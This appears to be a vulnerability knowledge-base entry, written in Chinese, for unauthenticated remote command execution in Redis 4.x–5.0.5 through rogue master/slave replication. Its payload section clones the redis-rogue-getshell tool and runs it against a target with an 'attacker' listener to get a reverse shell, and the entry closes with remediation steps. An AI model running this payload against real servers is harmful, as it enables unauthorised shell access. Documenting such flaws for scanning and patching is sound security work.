---
id: REDIS-4-UNACC
title: Redis 4.x/5.x 主从复制导致的命令执行
product: redis
vendor: Redis
version_affected: "4.x-5.0.5"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["Redis"]
---

## 漏洞描述

Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。在未授权访问或低版本情况下，可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。

## 影响版本

- Redis 4.x - 5.0.5

## 前置条件

- 无需认证（未授权访问）
- Redis 端口可访问

## 利用步骤

1. 使用 redis-rogue-getshell 工具连接目标
2. 执行命令

## Payload

```bash
git clone https://github.com/vulhub/redis-rogue-getshell
python3 redis-rogue-getshell.py --rhost target --rport 6379 --lhost attacker --lport 6666
```

## 验证方法

```bash
# 获取反弹 shell
```

## 修复建议

1. 升级 Redis 至最新版本
2. 设置强密码认证
3. 限制 Redis 端口访问来源
4. 禁用 CONFIG SET 等危险命令
